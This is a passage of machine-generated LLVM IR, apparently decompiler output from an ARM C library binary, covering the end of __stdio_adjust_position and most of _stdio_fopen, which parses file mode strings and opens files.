  %v3_19fa4 = inttoptr i32 %v2_19fa4 to i32*
  store i32 %v0_19fa4, i32* %v3_19fa4, align 4
  br label %dec_label_pc_19fb0

dec_label_pc_19fac:                               ; preds = %dec_label_pc_19f2c, %dec_label_pc_19f58, %dec_label_pc_19f44
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19fb0

dec_label_pc_19fb0:                               ; preds = %dec_label_pc_19f70, %dec_label_pc_19fac
  %v0_19fb0 = load i32, i32* %r7.global-to-local, align 4
  %v2_19fb0 = icmp eq i32 %v0_19fb0, 0
  br i1 %v2_19fb0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19fb0
  store i32 %v2_19ebc, i32* %r0.global-to-local, align 4
  store i32 95952, i32* %r3.global-to-local, align 4
  store i32 106440, i32* @lr, align 4
  call void @__pseudo_branch(i32 95952)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_19fb0, %dec_label_pc_19ecc, %bb
  %v0_19fc8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_19fc8, i32* %r0.global-to-local, align 4
  store i32 %v3_19eb4, i32* @r4, align 4
  store i32 %v6_19eb4, i32* @r5, align 4
  store i32 %v9_19eb4, i32* @r6, align 4
  ret i32 %v0_19fc8

; uselistorder directives
  uselistorder i32 %v0_19f58, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 9, 8, 11, 0, 10, 12 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19fb0, { 1, 0 }
  uselistorder label %dec_label_pc_19fac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_19f58, { 1, 0 }
  uselistorder label %dec_label_pc_19f20, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_19fe4 = load i32, i32* @r4, align 4
  store i32 %v3_19fe4, i32* %stack_var_-16, align 4
  %v2_19fe8 = add i32 %tmp, 1
  %v3_19fe8 = inttoptr i32 %v2_19fe8 to i8*
  %v4_19fe8 = load i8, i8* %v3_19fe8, align 1
  %v5_19fe8 = zext i8 %v4_19fe8 to i32
  %v3_19fec = load i8, i8* %arg1, align 1
  %v4_19fec = zext i8 %v3_19fec to i32
  store i32 %v4_19fec, i32* %r2.global-to-local, align 4
  %v4_19ff0 = mul nuw nsw i32 %v5_19fe8, 256
  %v5_19ff0 = or i32 %v4_19fec, %v4_19ff0
  store i32 %v5_19ff0, i32* @lr, align 4
  %tmp15 = urem i8 %v3_19fec, 4
  %v2_19ff4 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_19ff4, label %bb, label %dec_label_pc_1a004

bb:                                               ; preds = %entry
  br label %.thread

dec_label_pc_1a004:                               ; preds = %entry
  %v1_19ff4 = zext i8 %tmp15 to i32
  %v1_1a004 = add nsw i32 %v1_19ff4, -1
  %v7_1a004 = icmp eq i8 %tmp15, 1
  br i1 %v7_1a004, label %.thread, label %dec_label_pc_1a00c

dec_label_pc_1a00c:                               ; preds = %dec_label_pc_1a004
  %v1_1a00c = and i32 %v4_19ff0, 2048
  %v2_1a00c = icmp eq i32 %v1_1a00c, 0
  br i1 %v2_1a00c, label %.thread, label %dec_label_pc_1a014

dec_label_pc_1a014:                               ; preds = %dec_label_pc_1a00c
  %v8_1a018 = icmp sgt i32 %v1_1a004, 1
  br i1 %v8_1a018, label %dec_label_pc_1a0a4, label %dec_label_pc_1a01c

dec_label_pc_1a01c:                               ; preds = %dec_label_pc_1a014
  %v2_1a01c = add i32 %tmp, 40
  %v3_1a01c = inttoptr i32 %v2_1a01c to i32*
  %v4_1a01c = load i32, i32* %v3_1a01c, align 4
  %v2_1a020 = icmp eq i32 %v4_1a01c, 0
  br i1 %v2_1a020, label %dec_label_pc_1a028, label %dec_label_pc_1a0a4

dec_label_pc_1a028:                               ; preds = %dec_label_pc_1a01c
  %v2_1a028 = add i32 %tmp, 3
  %v3_1a028 = inttoptr i32 %v2_1a028 to i8*
  %v4_1a028 = load i8, i8* %v3_1a028, align 1
  %v5_1a028 = zext i8 %v4_1a028 to i32
  %v2_1a02c = add i32 %tmp, 44
  %v3_1a02c = inttoptr i32 %v2_1a02c to i32*
  %v4_1a02c = load i32, i32* %v3_1a02c, align 4
  store i32 %v4_1a02c, i32* %r2.global-to-local, align 4
  %v2_1a030 = sub nsw i32 %v1_1a004, %v5_1a028
  %v1_1a038 = add nsw i32 %v2_1a030, -1
  %tmp11 = icmp slt i32 %v4_1a02c, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_1a028
  %v7_1a03c = add i32 %tmp, 2
  %v8_1a03c = inttoptr i32 %v7_1a03c to i8*
  %v9_1a03c = load i8, i8* %v8_1a03c, align 1
  %v10_1a03c = zext i8 %v9_1a03c to i32
  %v7_1a040 = sub nsw i32 %v1_1a038, %v10_1a03c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a028, %bb, %dec_label_pc_1a00c, %dec_label_pc_1a004, %bb12
  %v0_1a05c = phi i32 [ %v1_1a004, %dec_label_pc_1a00c ], [ %v1_1a004, %dec_label_pc_1a004 ], [ 0, %bb ], [ %v7_1a040, %bb12 ], [ %v1_1a038, %dec_label_pc_1a028 ]
  %v1_1a044 = and i32 %v4_19fec, 64
  %v2_1a044 = icmp eq i32 %v1_1a044, 0
  %storemerge.in.in.v = select i1 %v2_1a044, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1a050 = add i32 %tmp, 16
  %v3_1a050 = inttoptr i32 %v2_1a050 to i32*
  %v4_1a050 = load i32, i32* %v3_1a050, align 4
  %v2_1a054 = sub i32 %storemerge, %v4_1a050
  %v1_1a058 = inttoptr i32 %arg2 to i32*
  %v2_1a058 = load i32, i32* %v1_1a058, align 4
  store i32 %v2_1a058, i32* %r1.global-to-local, align 4
  %v3_1a058 = add i32 %arg2, 4
  %v4_1a058 = inttoptr i32 %v3_1a058 to i32*
  %v5_1a058 = load i32, i32* %v4_1a058, align 4
  store i32 %v5_1a058, i32* %r2.global-to-local, align 4
  %v2_1a05c = add i32 %v2_1a054, %v0_1a05c
  store i32 %v2_1a05c, i32* %r5.global-to-local, align 4
  %v2_1a060 = sub i32 %v2_1a058, %v2_1a05c
  %v2_1a064 = and i32 %v2_1a05c, 1073741824
  %v3_1a064 = icmp ne i32 %v2_1a064, 0
  %v6_1a064 = icmp eq i1 %v3_1a064, false
  %tmp16 = icmp slt i32 %v2_1a05c, 0
  %v4_1a064.neg = zext i1 %tmp16 to i32
  %v7_1a064 = add i32 %v5_1a058, %v4_1a064.neg
  %v9_1a064 = sext i1 %v6_1a064 to i32
  %v10_1a064 = add i32 %v7_1a064, %v9_1a064
  store i32 %v10_1a064, i32* %r4.global-to-local, align 4
  store i32 %v2_1a060, i32* %v1_1a058, align 4
  %v5_1a068 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a068, i32* %v4_1a058, align 4
  %v0_1a06c = load i32, i32* %r6.global-to-local, align 4
  %v1_1a06c = add i32 %v0_1a06c, 4
  %v2_1a06c = inttoptr i32 %v1_1a06c to i32*
  %v3_1a06c = load i32, i32* %v2_1a06c, align 4
  %v1_1a070 = load i32, i32* %r2.global-to-local, align 4
  %v8_1a074 = icmp sgt i32 %v3_1a06c, %v1_1a070
  br i1 %v8_1a074, label %dec_label_pc_1a088, label %dec_label_pc_1a078

dec_label_pc_1a078:                               ; preds = %.thread
  %v9_1a070 = icmp eq i32 %v3_1a06c, %v1_1a070
  br i1 %v9_1a070, label %dec_label_pc_1a07c, label %dec_label_pc_1a08cthread-pre-split

dec_label_pc_1a07c:                               ; preds = %dec_label_pc_1a078
  %v1_1a07c = inttoptr i32 %v0_1a06c to i32*
  %v2_1a07c = load i32, i32* %v1_1a07c, align 4
  %v1_1a080 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_1a07c, %v1_1a080
  br i1 %tmp17, label %dec_label_pc_1a088, label %dec_label_pc_1a08cthread-pre-split

dec_label_pc_1a088:                               ; preds = %dec_label_pc_1a07c, %.thread
  %v0_1a088 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a088 = sub i32 0, %v0_1a088
  store i32 %v1_1a088, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a08c

dec_label_pc_1a08cthread-pre-split:               ; preds = %dec_label_pc_1a07c, %dec_label_pc_1a078
  %v0_1a08c.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a08c

dec_label_pc_1a08c:                               ; preds = %dec_label_pc_1a08cthread-pre-split, %dec_label_pc_1a088
  %v0_1a08c = phi i32 [ %v0_1a08c.pr, %dec_label_pc_1a08cthread-pre-split ], [ %v1_1a088, %dec_label_pc_1a088 ]
  %v1_1a08c = icmp slt i32 %v0_1a08c, 0
  br i1 %v1_1a08c, label %dec_label_pc_1a094, label %dec_label_pc_1a0a8

dec_label_pc_1a094:                               ; preds = %dec_label_pc_1a08c
  %v0_1a094 = call i32 @__errno_location()
  %v2_1a09c = inttoptr i32 %v0_1a094 to i32*
  store i32 75, i32* %v2_1a09c, align 4
  %v0_1a0a8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a0a8

dec_label_pc_1a0a4:                               ; preds = %dec_label_pc_1a01c, %dec_label_pc_1a014
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a0a8

dec_label_pc_1a0a8:                               ; preds = %dec_label_pc_1a08c, %dec_label_pc_1a094, %dec_label_pc_1a0a4
  %v0_1a0a8 = phi i32 [ %v0_1a08c, %dec_label_pc_1a08c ], [ %v0_1a0a8.pre, %dec_label_pc_1a094 ], [ -1, %dec_label_pc_1a0a4 ]
  %v2_1a0ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a0ac, i32* @r4, align 4
  ret i32 %v0_1a0a8

; uselistorder directives
  uselistorder i32 %v1_1a070, { 1, 0 }
  uselistorder i32 %v3_1a06c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_19fec, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 1073741824, { 2, 3, 0, 1 }
  uselistorder i32 2048, { 5, 6, 7, 8, 2, 3, 1, 4, 9, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1a0a8, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1a0b0 = load i32, i32* @r4, align 4
  store i32 %v3_1a0b0, i32* %stack_var_-24, align 4
  %v6_1a0b0 = load i32, i32* @r5, align 4
  %v9_1a0b0 = load i32, i32* @r6, align 4
  %v15_1a0b0 = load i32, i32* @r8, align 4
  %v0_1a0b4 = load i32, i32* @r1, align 4
  %v1_1a0b4 = inttoptr i32 %v0_1a0b4 to i8*
  %v2_1a0b4 = load i8, i8* %v1_1a0b4, align 1
  %v7_1a0b8 = icmp eq i8 %v2_1a0b4, 114
  store i1 %v7_1a0b8, i1* %cpsr_z.global-to-local, align 1
  %v2_1a0bc = ptrtoint i32* %stack_var_-56 to i32
  %v0_1a0c0 = load i32, i32* @r0, align 4
  store i32 %v0_1a0c0, i32* @r6, align 4
  %v0_1a0c4 = load i32, i32* @r2, align 4
  store i32 %v0_1a0c4, i32* @r8, align 4
  %v0_1a0c8 = load i32, i32* @r3, align 4
  store i32 %v0_1a0c8, i32* @r5, align 4
  br i1 %v7_1a0b8, label %dec_label_pc_1a114, label %dec_label_pc_1a0d0

dec_label_pc_1a0d0:                               ; preds = %entry
  %v7_1a0d0 = icmp eq i8 %v2_1a0b4, 119
  store i1 %v7_1a0d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a0d0, label %bb, label %dec_label_pc_1a0dc

bb:                                               ; preds = %dec_label_pc_1a0d0
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_1a118

dec_label_pc_1a0dc:                               ; preds = %dec_label_pc_1a0d0
  %v7_1a0dc = icmp eq i8 %v2_1a0b4, 97
  store i1 %v7_1a0dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a0dc, label %bb30, label %dec_label_pc_1a0e8

bb30:                                             ; preds = %dec_label_pc_1a0dc
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_1a118

dec_label_pc_1a0e8:                               ; preds = %dec_label_pc_1a0dc, %dec_label_pc_1a1a0, %dec_label_pc_1a174
  %v0_1a0e8 = call i32 @__errno_location()
  store i32 %v0_1a0e8, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_1a0f0 = load i32, i32* @r8, align 4
  %v2_1a0f0 = icmp eq i32 %v0_1a0f0, 0
  store i1 %v2_1a0f0, i1* %cpsr_z.global-to-local, align 1
  %v2_1a0f4 = inttoptr i32 %v0_1a0e8 to i32*
  store i32 22, i32* %v2_1a0f4, align 4
  br i1 %v2_1a0f0, label %dec_label_pc_1a368, label %dec_label_pc_1a0fc

dec_label_pc_1a0fc:                               ; preds = %dec_label_pc_1a1c4._crit_edge, %dec_label_pc_1a0e8
  %v0_1a0fc = load i32, i32* @r8, align 4
  %v1_1a0fc = add i32 %v0_1a0fc, 1
  %v2_1a0fc = inttoptr i32 %v1_1a0fc to i8*
  %v3_1a0fc = load i8, i8* %v2_1a0fc, align 1
  %v4_1a0fc = zext i8 %v3_1a0fc to i32
  store i32 %v4_1a0fc, i32* %r3.global-to-local, align 4
  %v1_1a100 = and i32 %v4_1a0fc, 32
  %v2_1a100 = icmp eq i32 %v1_1a100, 0
  store i1 %v2_1a100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a100, label %dec_label_pc_1a368, label %dec_label_pc_1a108

dec_label_pc_1a108:                               ; preds = %dec_label_pc_1a0fc
  store i32 %v0_1a0fc, i32* %r0.global-to-local, align 4
  %v2_1a10c = call i32 @free(i32 %v0_1a0fc)
  store i32 %v2_1a10c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a368

dec_label_pc_1a114:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1a118

dec_label_pc_1a118:                               ; preds = %bb, %bb30, %dec_label_pc_1a114
  %v1_1a130 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_1a114 ]
  %v1_1a118 = add i32 %v0_1a0b4, 1
  %v2_1a118 = inttoptr i32 %v1_1a118 to i8*
  %v3_1a118 = load i8, i8* %v2_1a118, align 1
  %v7_1a11c = icmp eq i8 %v3_1a118, 98
  store i1 %v7_1a11c, i1* %cpsr_z.global-to-local, align 1
  %v1_1a118.v0_1a0b4 = select i1 %v7_1a11c, i32 %v1_1a118, i32 %v0_1a0b4
  store i32 %v1_1a118.v0_1a0b4, i32* %r3.global-to-local, align 4
  %v1_1a128 = add i32 %v1_1a118.v0_1a0b4, 1
  %v2_1a128 = inttoptr i32 %v1_1a128 to i8*
  %v3_1a128 = load i8, i8* %v2_1a128, align 1
  %v4_1a128 = zext i8 %v3_1a128 to i32
  store i32 %v4_1a128, i32* %r3.global-to-local, align 4
  %v7_1a12c = icmp eq i8 %v3_1a128, 43
  store i1 %v7_1a12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a12c, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_1a118
  store i32 %v1_1a130, i32* %r3.global-to-local, align 4
  %v2_1a134 = add nuw nsw i32 %v1_1a130, 1
  store i32 %v2_1a134, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1a118, %bb33
  %v2_1a138 = icmp eq i32 %v0_1a0c4, 0
  store i1 %v2_1a138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a138, label %dec_label_pc_1a140, label %dec_label_pc_1a16c

dec_label_pc_1a140:                               ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_1a144 = call i32 @malloc(i32 80)
  store i32 %v1_1a144, i32* %r0.global-to-local, align 4
  store i32 %v1_1a144, i32* @r8, align 4
  %v3_1a148 = icmp eq i32 %v1_1a144, 0
  store i1 %v3_1a148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1a148, label %dec_label_pc_1a36c, label %dec_label_pc_1a150

dec_label_pc_1a150:                               ; preds = %dec_label_pc_1a140
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_1a158 = add i32 %v1_1a144, 1
  %v4_1a158 = inttoptr i32 %v3_1a158 to i8*
  store i8 32, i8* %v4_1a158, align 1
  %v0_1a15c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a15c = load i32, i32* @r8, align 4
  %v2_1a15c = add i32 %v1_1a15c, 8
  %v3_1a15c = inttoptr i32 %v2_1a15c to i32*
  store i32 %v0_1a15c, i32* %v3_1a15c, align 4
  %v0_1a160 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a160 = trunc i32 %v0_1a160 to i8
  %v2_1a160 = load i32, i32* @r8, align 4
  %v3_1a160 = inttoptr i32 %v2_1a160 to i8*
  store i8 %v1_1a160, i8* %v3_1a160, align 1
  %v0_1a164 = load i32, i32* @r8, align 4
  %v1_1a164 = add i32 %v0_1a164, 56
  store i32 %v1_1a164, i32* @r0, align 4
  %v0_1a168 = call i32 @__stdio_init_mutex()
  store i32 %v0_1a168, i32* %r0.global-to-local, align 4
  %v0_1a16c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a16c

dec_label_pc_1a16c:                               ; preds = %.thread4, %dec_label_pc_1a150
  %v0_1a1c4 = phi i32 [ %v0_1a0c8, %.thread4 ], [ %v0_1a16c.pre, %dec_label_pc_1a150 ]
  %v1_1a16c = icmp slt i32 %v0_1a1c4, 0
  %v2_1a16c = icmp eq i32 %v0_1a1c4, 0
  store i1 %v2_1a16c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1a16c, label %dec_label_pc_1a1c4, label %dec_label_pc_1a174

dec_label_pc_1a174:                               ; preds = %dec_label_pc_1a16c
  %v0_1a178 = load i32, i32* @r4, align 4
  %v2_1a178 = and i32 %v0_1a178, ptrtoint ([3 x i8]* @global_var_20003.1188 to i32)
  %v1_1a17c = add i32 %v2_1a178, 1
  store i32 %v1_1a17c, i32* %r2.global-to-local, align 4
  %v0_1a180 = load i32, i32* @r6, align 4
  %v1_1a180 = add i32 %v0_1a180, 1
  %v2_1a184 = and i32 %v1_1a180, %v1_1a17c
  store i32 %v2_1a184, i32* %r3.global-to-local, align 4
  %v9_1a188 = icmp eq i32 %v2_1a184, %v1_1a17c
  store i1 %v9_1a188, i1* %cpsr_z.global-to-local, align 1
  %v1_1a18c = load i32, i32* @r8, align 4
  %v2_1a18c = add i32 %v1_1a18c, 4
  %v3_1a18c = inttoptr i32 %v2_1a18c to i32*
  store i32 %v0_1a1c4, i32* %v3_1a18c, align 4
  br i1 %v9_1a188, label %dec_label_pc_1a194, label %dec_label_pc_1a0e8

dec_label_pc_1a194:                               ; preds = %dec_label_pc_1a174
  %v0_1a194 = load i32, i32* @r4, align 4
  %v1_1a194 = load i32, i32* @r6, align 4
  %v2_1a194 = sub i32 -1, %v1_1a194
  %v3_1a194 = and i32 %v0_1a194, %v2_1a194
  store i32 %v3_1a194, i32* %r3.global-to-local, align 4
  %v1_1a198 = and i32 %v3_1a194, 1024
  %v2_1a198 = icmp eq i32 %v1_1a198, 0
  store i1 %v2_1a198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a198, label %dec_label_pc_1a1b8, label %dec_label_pc_1a1a0

dec_label_pc_1a1a0:                               ; preds = %dec_label_pc_1a194
  %v0_1a1a0 = load i32, i32* @r5, align 4
  store i32 %v0_1a1a0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_1a1ac = call i32 @__libc_fcntl(i32 %v0_1a1a0, i32 4)
  store i32 %v2_1a1ac, i32* %r0.global-to-local, align 4
  %v2_1a1b0 = icmp eq i32 %v2_1a1ac, 0
  store i1 %v2_1a1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a1b0, label %dec_label_pc_1a1a0.dec_label_pc_1a1b8_crit_edge, label %dec_label_pc_1a0e8

dec_label_pc_1a1a0.dec_label_pc_1a1b8_crit_edge:  ; preds = %dec_label_pc_1a1a0
  %v0_1a1b8.pre = load i32, i32* @r6, align 4
  %v0_1a1bc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a1b8

dec_label_pc_1a1b8:                               ; preds = %dec_label_pc_1a1a0.dec_label_pc_1a1b8_crit_edge, %dec_label_pc_1a194
  %v0_1a1bc = phi i32 [ %v0_1a1bc.pre, %dec_label_pc_1a1a0.dec_label_pc_1a1b8_crit_edge ], [ %v0_1a194, %dec_label_pc_1a194 ]
  %v0_1a1b8 = phi i32 [ %v0_1a1b8.pre, %dec_label_pc_1a1a0.dec_label_pc_1a1b8_crit_edge ], [ %v1_1a194, %dec_label_pc_1a194 ]
  %v1_1a1b8 = and i32 %v0_1a1b8, 131072
  store i32 %v1_1a1b8, i32* %r3.global-to-local, align 4
  %v2_1a1bc = or i32 %v1_1a1b8, %v0_1a1bc
  store i32 %v2_1a1bc, i32* @r4, align 4
  br label %dec_label_pc_1a1e8

dec_label_pc_1a1c4:                               ; preds = %dec_label_pc_1a16c
  %v7_1a1c4 = icmp eq i32 %v0_1a1c4, -1
  store i1 %v7_1a1c4, i1* %cpsr_z.global-to-local, align 1
  %v0_1a1d0.pre = load i32, i32* @r4, align 4
  br i1 %v7_1a1c4, label %dec_label_pc_1a1c4._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_1a1c4
  %v2_1a1c8 = or i32 %v0_1a1d0.pre, ptrtoint ([6 x i8]* @global_var_20000.1189 to i32)
  store i32 %v2_1a1c8, i32* @r4, align 4
  br label %dec_label_pc_1a1c4._crit_edge

dec_label_pc_1a1c4._crit_edge:                    ; preds = %dec_label_pc_1a1c4, %bb34
  %v0_1a1d0 = phi i32 [ %v2_1a1c8, %bb34 ], [ %v0_1a1d0.pre, %dec_label_pc_1a1c4 ]
  %v0_1a1cc = load i32, i32* @r6, align 4
  store i32 %v0_1a1cc, i32* %r0.global-to-local, align 4
  store i32 %v0_1a1d0, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1a1d8 = inttoptr i32 %v0_1a1cc to i8*
  %v3_1a1d8 = call i32 @__libc_open(i8* %v2_1a1d8, i32 %v0_1a1d0)
  store i32 %v3_1a1d8, i32* %r0.global-to-local, align 4
  %v1_1a1dc = icmp slt i32 %v3_1a1d8, 0
  %v2_1a1dc = icmp eq i32 %v3_1a1d8, 0
  store i1 %v2_1a1dc, i1* %cpsr_z.global-to-local, align 1
  %v1_1a1e0 = load i32, i32* @r8, align 4
  %v2_1a1e0 = add i32 %v1_1a1e0, 4
  %v3_1a1e0 = inttoptr i32 %v2_1a1e0 to i32*
  store i32 %v3_1a1d8, i32* %v3_1a1e0, align 4
  br i1 %v1_1a1dc, label %dec_label_pc_1a0fc, label %dec_label_pc_1a1e8

dec_label_pc_1a1e8:                               ; preds = %dec_label_pc_1a1c4._crit_edge, %dec_label_pc_1a1b8
  %v0_1a1e8 = load i32, i32* @r8, align 4
  %v1_1a1e8 = inttoptr i32 %v0_1a1e8 to i32*
  %v2_1a1e8 = load i32, i32* %v1_1a1e8, align 4
  %v1_1a1ec = and i32 %v2_1a1e8, 8192
  store i32 %v1_1a1ec, i32* %r3.global-to-local, align 4
  %v3_1a1f01 = udiv i32 %v1_1a1ec, 256
  store i32 %v3_1a1f01, i32* %r2.global-to-local, align 4
  %v1_1a1f4 = trunc i32 %v3_1a1f01 to i8
  %v3_1a1f4 = add i32 %v0_1a1e8, 1
  %v4_1a1f4 = inttoptr i32 %v3_1a1f4 to i8*
  store i8 %v1_1a1f4, i8* %v4_1a1f4, align 1
  %v0_1a1f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a1f8 = trunc i32 %v0_1a1f8 to i8
  %v2_1a1f8 = load i32, i32* @r8, align 4
  %v3_1a1f8 = inttoptr i32 %v2_1a1f8 to i8*
  store i8 %v1_1a1f8, i8* %v3_1a1f8, align 1
  %v0_1a1fc = load i32, i32* @r4, align 4
  %v1_1a1fc = and i32 %v0_1a1fc, ptrtoint ([6 x i8]* @global_var_20000.1189 to i32)
  store i32 %v1_1a1fc, i32* %r1.global-to-local, align 4
  %v2_1a1fc = icmp eq i32 %v1_1a1fc, 0
  store i1 %v2_1a1fc, i1* %cpsr_z.global-to-local, align 1
  %v0_1a200 = load i32, i32* @r8, align 4
  %v1_1a200 = add i32 %v0_1a200, 1
  %v2_1a200 = inttoptr i32 %v1_1a200 to i8*
  %v3_1a200 = load i8, i8* %v2_1a200, align 1
  %v4_1a200 = zext i8 %v3_1a200 to i32
  %v1_1a204 = inttoptr i32 %v0_1a200 to i8*
  %v2_1a204 = load i8, i8* %v1_1a204, align 1
  %v3_1a204 = zext i8 %v2_1a204 to i32
  store i32 %v3_1a204, i32* %r3.global-to-local, align 4
  br i1 %v2_1a1fc, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_1a1e8
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_1a1e8, %bb35
  %v0_1a218 = phi i32 [ 0, %dec_label_pc_1a1e8 ], [ 32768, %bb35 ]
  %v1_1a20c = and i32 %v0_1a1fc, 1024
  store i32 %v1_1a20c, i32* %r0.global-to-local, align 4
  %v4_1a214 = mul nuw nsw i32 %v4_1a200, 256
  %v5_1a214 = or i32 %v3_1a204, %v4_1a214
  %v2_1a218 = or i32 %v0_1a218, %v1_1a20c
  store i32 %v2_1a218, i32* %r1.global-to-local, align 4
  %v2_1a220 = or i32 %v5_1a214, %v2_1a218
  %v1_1a210 = mul i32 %v0_1a1fc, 16
  %v1_1a21c = and i32 %v1_1a210, 48
  %v1_1a224 = add nuw nsw i32 %v1_1a21c, 16
  %v4_1a228 = xor i32 %v1_1a224, 48
  %v5_1a228 = or i32 %v2_1a220, %v4_1a228
  store i32 %v5_1a228, i32* %r3.global-to-local, align 4
  %v3_1a22c19 = udiv i32 %v2_1a220, 256
  store i32 %v3_1a22c19, i32* %r2.global-to-local, align 4
  %v1_1a230 = trunc i32 %v3_1a22c19 to i8
  store i8 %v1_1a230, i8* %v2_1a200, align 1
  %v0_1a234 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a234 = trunc i32 %v0_1a234 to i8
  %v2_1a234 = load i32, i32* @r8, align 4
  %v3_1a234 = inttoptr i32 %v2_1a234 to i8*
  store i8 %v1_1a234, i8* %v3_1a234, align 1
  %v0_1a238 = call i32 @__errno_location()
  store i32 %v0_1a238, i32* %r0.global-to-local, align 4
  %v0_1a23c = load i32, i32* @r8, align 4
  %v1_1a23c = add i32 %v0_1a23c, 1
  %v2_1a23c = inttoptr i32 %v1_1a23c to i8*
  %v3_1a23c = load i8, i8* %v2_1a23c, align 1
  %v4_1a23c = zext i8 %v3_1a23c to i32
  store i32 %v4_1a23c, i32* %r3.global-to-local, align 4
  %v1_1a240 = inttoptr i32 %v0_1a23c to i8*
  %v2_1a240 = load i8, i8* %v1_1a240, align 1
  %v3_1a240 = zext i8 %v2_1a240 to i32
  store i32 %v0_1a238, i32* @r6, align 4
  %v1_1a248 = add i32 %v0_1a23c, 4
  %v2_1a248 = inttoptr i32 %v1_1a248 to i32*
  %v3_1a248 = load i32, i32* %v2_1a248, align 4
  store i32 %v3_1a248, i32* @r0, align 4
  %v4_1a24c = mul nuw nsw i32 %v4_1a23c, 256
  %v5_1a24c = or i32 %v3_1a240, %v4_1a24c
  store i32 %v5_1a24c, i32* @r4, align 4
  %v1_1a250 = inttoptr i32 %v0_1a238 to i32*
  %v2_1a250 = load i32, i32* %v1_1a250, align 4
  store i32 %v2_1a250, i32* @r5, align 4
  %v1_1a254 = call i32 @isatty(i32 %v3_1a248)
  store i32 %v1_1a254, i32* %r0.global-to-local, align 4
  %v0_1a258 = load i32, i32* @r4, align 4
  %v4_1a258 = mul i32 %v1_1a254, 256
  %v5_1a258 = or i32 %v0_1a258, %v4_1a258
